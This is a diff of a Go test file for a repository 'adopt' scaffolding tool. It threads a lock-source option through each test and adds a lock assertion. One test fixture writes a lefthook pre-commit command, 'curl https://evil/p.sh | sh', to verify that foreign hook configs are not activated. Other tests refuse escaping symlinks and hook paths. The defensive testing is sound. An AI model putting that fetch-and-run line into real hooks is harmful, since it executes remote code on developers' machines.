@@ -182,11 +182,12 @@ func TestAdopt_Positive_Greenfield(t *testing.T) {
 	repoPath := newTestRepo(t, "new-service")
 	mustWrite(t, filepath.Join(repoPath, "go.mod"), "module github.com/test/service\n")
 
-	report, err := Adopt(context.Background(), AdoptOptions{Path: repoPath, Profile: "framework"})
+	report, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, Profile: "framework"})
 	if err != nil {
 		t.Fatalf("Adopt greenfield failed: %v", err)
 	}
 	assertNoIssues(t, report)
+	assertAdoptedLock(t, repoPath)
 	if report.State != StateGreenfield {
 		t.Fatalf("expected state greenfield, got: %s", report.State)
 	}
@@ -233,7 +234,7 @@ func TestAdopt_Positive_PartialAndDryRun(t *testing.T) {
 	mustWrite(t, filepath.Join(repoPath, ".standards.yaml"), "version: 1\n")
 
 	before := snapshotTree(t, repoPath)
-	repDry, err := Adopt(context.Background(), AdoptOptions{Path: repoPath, DryRun: true})
+	repDry, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, DryRun: true})
 	if err != nil {
 		t.Fatalf("Adopt dry-run failed: %v", err)
 	}
@@ -243,7 +244,7 @@ func TestAdopt_Positive_PartialAndDryRun(t *testing.T) {
 		t.Fatalf("expected partial state, got: %s", repDry.State)
 	}
 
-	repLive, err := Adopt(context.Background(), AdoptOptions{Path: repoPath})
+	repLive, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath})
 	if err != nil {
 		t.Fatalf("Adopt live failed: %v", err)
 	}
@@ -270,7 +271,7 @@ func TestAdopt_Positive_BrownfieldWithDebtRatcheting(t *testing.T) {
 	repoPath := newTestRepo(t, "legacy-repo")
 	mustWrite(t, filepath.Join(repoPath, "main.go"), "package main\nfunc run() {\n\t_ = doSomething()\n}\n")
 
-	rep, err := Adopt(context.Background(), AdoptOptions{Path: repoPath, RecordBaseline: true})
+	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, RecordBaseline: true})
 	if err != nil {
 		t.Fatalf("Adopt brownfield failed: %v", err)
 	}
@@ -283,7 +284,7 @@ func TestAdopt_Positive_BrownfieldWithDebtRatcheting(t *testing.T) {
 	}
 
 	// A second live run on the now fully scaffolded repository observes brownfield state.
-	rep2, err := Adopt(context.Background(), AdoptOptions{Path: repoPath})
+	rep2, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath})
 	if err != nil {
 		t.Fatalf("second Adopt failed: %v", err)
 	}
@@ -306,6 +307,7 @@ func TestAdopt_Positive_ExplicitFacetsAndSkipGitValidation(t *testing.T) {
 	}
 
 	rep, err := Adopt(context.Background(), AdoptOptions{
+		LockSourceRoot:    newAdoptLockSource(t),
 		Path:              repoPath,
 		Facets:            []string{"custom:facet"},
 		SkipGitValidation: true,
@@ -325,7 +327,7 @@ func TestAdopt_Positive_ForceRegeneratesScaffolds(t *testing.T) {
 	mustWrite(t, filepath.Join(repoPath, "lefthook.yml"), "pre-commit:\n  commands:\n    custom:\n      run: echo custom\n")
 	mustWrite(t, filepath.Join(repoPath, ".config", "labels.yaml"), "version: 0\n")
 
-	rep, err := Adopt(context.Background(), AdoptOptions{Path: repoPath, Force: true})
+	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, Force: true})
 	if err != nil {
 		t.Fatalf("Adopt --force failed: %v", err)
 	}
@@ -385,7 +387,7 @@ func TestAdopt_Negative_SymlinkedTargetsAreRefused(t *testing.T) {
 			t.Skipf("symlinks unavailable: %v", err)
 		}
 
-		rep, err := Adopt(context.Background(), AdoptOptions{Path: repoPath})
+		rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath})
 		if err == nil {
 			t.Fatalf("%s: expected adoption to refuse a symlink escaping the repository", name)
 		}
@@ -404,7 +406,7 @@ func TestAdopt_Negative_DanglingSymlinkIsNotCreatedThrough(t *testing.T) {
 	if err := os.Symlink(target, filepath.Join(repoPath, "AGENTS.md")); err != nil {
 		t.Skipf("symlinks unavailable: %v", err)
 	}
-	if _, err := Adopt(context.Background(), AdoptOptions{Path: repoPath}); err == nil {
+	if _, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath}); err == nil {
 		t.Fatal("expected adoption to refuse a dangling symlink")
 	}
 	if _, err := os.Lstat(target); !errors.Is(err, os.ErrNotExist) {
@@ -423,7 +425,7 @@ func TestAdopt_Negative_PartialReportOnFailure(t *testing.T) {
 	}
 	t.Cleanup(func() { restoreMode(t, filepath.Join(repoPath, "Makefile")) })
 
-	rep, err := Adopt(context.Background(), AdoptOptions{Path: repoPath})
+	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath})
 	if err == nil {
 		t.Fatal("expected an error for an unreadable Makefile")
 	}
@@ -444,7 +446,7 @@ func TestAdopt_Negative_UnreadableReadmeIsAnError(t *testing.T) {
 	}
 	t.Cleanup(func() { restoreMode(t, readme) })
 
-	if _, err := Adopt(context.Background(), AdoptOptions{Path: repoPath}); err == nil {
+	if _, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath}); err == nil {
 		t.Fatal("an existing but unreadable README.md must fail adoption, not be skipped silently")
 	}
 }
@@ -480,7 +482,7 @@ func TestAdopt_Boundary_EmptyRepoPathDefaults(t *testing.T) {
 	repoPath := newTestRepo(t, "empty")
 	before := snapshotTree(t, repoPath)
 
-	rep, err := Adopt(context.Background(), AdoptOptions{Path: repoPath, DryRun: true})
+	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, DryRun: true})
 	if err != nil {
 		t.Fatalf("Adopt on empty repo failed: %v", err)
 	}
@@ -498,7 +500,7 @@ func TestAdopt_Boundary_EmptyPathMeansCwd(t *testing.T) {
 	repoPath := newTestRepo(t, "cwd-repo")
 	t.Chdir(repoPath)
 	before := snapshotTree(t, repoPath)
-	rep, err := Adopt(context.Background(), AdoptOptions{Path: "", DryRun: true})
+	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: "", DryRun: true})
 	if err != nil {
 		t.Fatalf("empty path must resolve to the working directory: %v", err)
 	}
@@ -578,7 +580,7 @@ func TestAdopt_MultiLanguageLegacyDebt(t *testing.T) {
 	mustWrite(t, filepath.Join(repoPath, "lib.rs"), "fn main() {\n    let val = Some(1).unwrap();\n}\n")
 
 	before := snapshotTree(t, repoPath)
-	rep, err := Adopt(context.Background(), AdoptOptions{Path: repoPath, Profile: "native-gpu-systems", RecordBaseline: true, DryRun: true})
+	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, Profile: "native-gpu-systems", RecordBaseline: true, DryRun: true})
 	if err != nil {
 		t.Fatalf("Adopt failed: %v", err)
 	}
@@ -608,7 +610,7 @@ func TestAdopt_NASARule4_FunctionLengthLimit(t *testing.T) {
 	mustWrite(t, filepath.Join(repoPath, "long.py"), pyCode.String())
 
 	before := snapshotTree(t, repoPath)
-	rep, err := Adopt(context.Background(), AdoptOptions{Path: repoPath, Profile: "framework", RecordBaseline: true, DryRun: true})
+	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, Profile: "framework", RecordBaseline: true, DryRun: true})
 	if err != nil {
 		t.Fatalf("Adopt failed: %v", err)
 	}
@@ -627,7 +629,7 @@ func TestAdopt_ExistingAgentsMDMerged(t *testing.T) {
 	custom := "# Custom Project Guidelines\n- Rule 1: Always check tests\n- Rule 2: Keep commits clean\n"
 	mustWrite(t, filepath.Join(repoPath, "AGENTS.md"), custom)
 
-	rep, err := Adopt(context.Background(), AdoptOptions{Path: repoPath, Profile: "framework"})
+	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, Profile: "framework"})
 	if err != nil {
 		t.Fatalf("Adopt failed: %v", err)
 	}
@@ -652,7 +654,7 @@ func TestAdopt_AgentsMD_ForcePreservesCustomInstructions(t *testing.T) {
 		repoPath := newTestRepo(t, name)
 		mustWrite(t, filepath.Join(repoPath, "AGENTS.md"), initial)
 
-		rep, err := Adopt(context.Background(), AdoptOptions{Path: repoPath, Profile: "framework", Force: true})
+		rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, Profile: "framework", Force: true})
 		if err != nil {
 			t.Fatalf("%s: Adopt failed: %v", name, err)
 		}
@@ -669,7 +671,7 @@ func TestAdopt_AgentsMD_ForcePreservesCustomInstructions(t *testing.T) {
 		}
 
 		// A second --force run is idempotent.
-		if _, err := Adopt(context.Background(), AdoptOptions{Path: repoPath, Profile: "framework", Force: true}); err != nil {
+		if _, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, Profile: "framework", Force: true}); err != nil {
 			t.Fatalf("%s: second Adopt failed: %v", name, err)
 		}
 		if again := mustRead(t, filepath.Join(repoPath, "AGENTS.md")); again != content {
@@ -683,7 +685,7 @@ func TestAdopt_AgentsMD_ForceRefusesUnknownBoundary(t *testing.T) {
 	initial := "# Something Agent Operating Harness\nhand written rules without any separator\n"
 	mustWrite(t, filepath.Join(repoPath, "AGENTS.md"), initial)
 
-	rep, err := Adopt(context.Background(), AdoptOptions{Path: repoPath, Force: true})
+	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, Force: true})
 	if err != nil {
 		t.Fatalf("Adopt failed: %v", err)
 	}
@@ -718,7 +720,7 @@ func TestAdopt_GovernanceTextsScaffolded(t *testing.T) {
 	repoPath := newTestRepo(t, "governance")
 	mustWrite(t, filepath.Join(repoPath, "README.md"), "# My Awesome Project\nSome description here.\n")
 
-	rep, err := Adopt(context.Background(), AdoptOptions{Path: repoPath, Profile: "framework"})
+	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, Profile: "framework"})
 	if err != nil {
 		t.Fatalf("Adopt failed: %v", err)
 	}
@@ -742,7 +744,7 @@ func TestAdopt_ReadmeBadgeReflectsBaselinedDebt(t *testing.T) {
 	mustWrite(t, filepath.Join(repoPath, "README.md"), "# Legacy\n")
 	mustWrite(t, filepath.Join(repoPath, "main.go"), "package main\nfunc run() {\n\t_ = doSomething()\n}\n")
 
-	rep, err := Adopt(context.Background(), AdoptOptions{Path: repoPath, RecordBaseline: true})
+	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, RecordBaseline: true})
 	if err != nil {
 		t.Fatalf("Adopt failed: %v", err)
 	}
@@ -775,7 +777,7 @@ func TestAdopt_ExistingMakefileAppended(t *testing.T) {
 	repoPath := newTestRepo(t, "makefile")
 	mustWrite(t, filepath.Join(repoPath, "Makefile"), "all:\n\t@echo \"Building...\"\n")
 
-	rep, err := Adopt(context.Background(), AdoptOptions{Path: repoPath, Profile: "framework"})
+	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, Profile: "framework"})
 	if err != nil {
 		t.Fatalf("Adopt failed: %v", err)
 	}
@@ -817,7 +819,7 @@ func TestAdopt_EditorsPreservedWithoutForce(t *testing.T) {
 	mustWrite(t, filepath.Join(repoPath, ".vscode", "settings.json"), custom)
 	mustWrite(t, filepath.Join(repoPath, ".editorconfig"), "root = true\n")
 
-	rep, err := Adopt(context.Background(), AdoptOptions{Path: repoPath, Profile: "framework"})
+	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, Profile: "framework"})
 	if err != nil {
 		t.Fatalf("Adopt failed: %v", err)
 	}
@@ -829,7 +831,7 @@ func TestAdopt_EditorsPreservedWithoutForce(t *testing.T) {
 		t.Errorf("preserved editor file must be reported as reconciled, got %v", rep.ReconciledFiles)
 	}
 
-	rep, err = Adopt(context.Background(), AdoptOptions{Path: repoPath, Profile: "framework", Force: true})
+	rep, err = Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, Profile: "framework", Force: true})
 	if err != nil {
 		t.Fatalf("Adopt --force failed: %v", err)
 	}
@@ -851,7 +853,7 @@ func TestAdopt_Hooks_ExistingPreCommitPreservedWithoutForce(t *testing.T) {
 	custom := "#!/bin/sh\necho secret-scan\n"
 	mustWrite(t, filepath.Join(repoPath, ".git", "hooks", "pre-commit"), custom)
 
-	rep, err := Adopt(context.Background(), AdoptOptions{Path: repoPath})
+	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath})
 	if err != nil {
 		t.Fatalf("Adopt failed: %v", err)
 	}
@@ -863,7 +865,7 @@ func TestAdopt_Hooks_ExistingPreCommitPreservedWithoutForce(t *testing.T) {
 		t.Fatalf("expected a skip action and a warning, got actions=%v warnings=%v", rep.ActionDetails, rep.Warnings)
 	}
 
-	rep, err = Adopt(context.Background(), AdoptOptions{Path: repoPath, Force: true})
+	rep, err = Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, Force: true})
 	if err != nil {
 		t.Fatalf("Adopt --force failed: %v", err)
 	}
@@ -880,7 +882,7 @@ func TestAdopt_Hooks_ForeignLefthookConfigIsNotActivated(t *testing.T) {
 	repoPath := newTestRepo(t, "foreign-lefthook")
 	mustWrite(t, filepath.Join(repoPath, "lefthook.yml"), "pre-commit:\n  commands:\n    evil:\n      run: curl https://evil/p.sh | sh\n")
 
-	rep, err := Adopt(context.Background(), AdoptOptions{Path: repoPath})
+	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath})
 	if err != nil {
 		t.Fatalf("Adopt failed: %v", err)
 	}
@@ -905,7 +907,7 @@ func TestAdopt_Hooks_LefthookInstallHonoursHooksPath(t *testing.T) {
 	initTestGit(t, repoPath)
 	mustWrite(t, filepath.Join(repoPath, ".git", "config"), "[core]\n\thooksPath = .husky\n")
 
-	rep, err := Adopt(context.Background(), AdoptOptions{Path: repoPath})
+	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath})
 	if err != nil {
 		t.Fatalf("Adopt failed: %v", err)
 	}
@@ -922,7 +924,7 @@ func TestAdopt_Hooks_FallbackHonoursHooksPath(t *testing.T) {
 	repoPath := newTestRepo(t, "fallback-hookspath")
 	mustWrite(t, filepath.Join(repoPath, ".git", "config"), "[core]\n\thooksPath = .husky\n")
 
-	rep, err := Adopt(context.Background(), AdoptOptions{Path: repoPath})
+	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath})
 	if err != nil {
 		t.Fatalf("Adopt failed: %v", err)
 	}
@@ -948,7 +950,7 @@ func TestAdopt_Hooks_GitlinkWorktreeUsesCommonHooksDir(t *testing.T) {
 	mustWrite(t, filepath.Join(wtGitDir, "gitdir"), filepath.Join(worktree, ".git")+"\n")
 	mustWrite(t, filepath.Join(worktree, ".git"), "gitdir: "+wtGitDir+"\n")
 
-	rep, err := Adopt(context.Background(), AdoptOptions{Path: worktree})
+	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: worktree})
 	if err != nil {
 		t.Fatalf("Adopt failed: %v", err)
 	}
@@ -969,7 +971,7 @@ func TestResolveGitHooksDir_Negative_EscapingDiscoveryIsRefused(t *testing.T) {
 		t.Fatalf("expected ErrHooksDirEscapesRepo, got %v", err)
 	}
 
-	rep, err := Adopt(context.Background(), AdoptOptions{Path: inner})
+	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: inner})
 	if err != nil {
 		t.Fatalf("Adopt failed: %v", err)
 	}
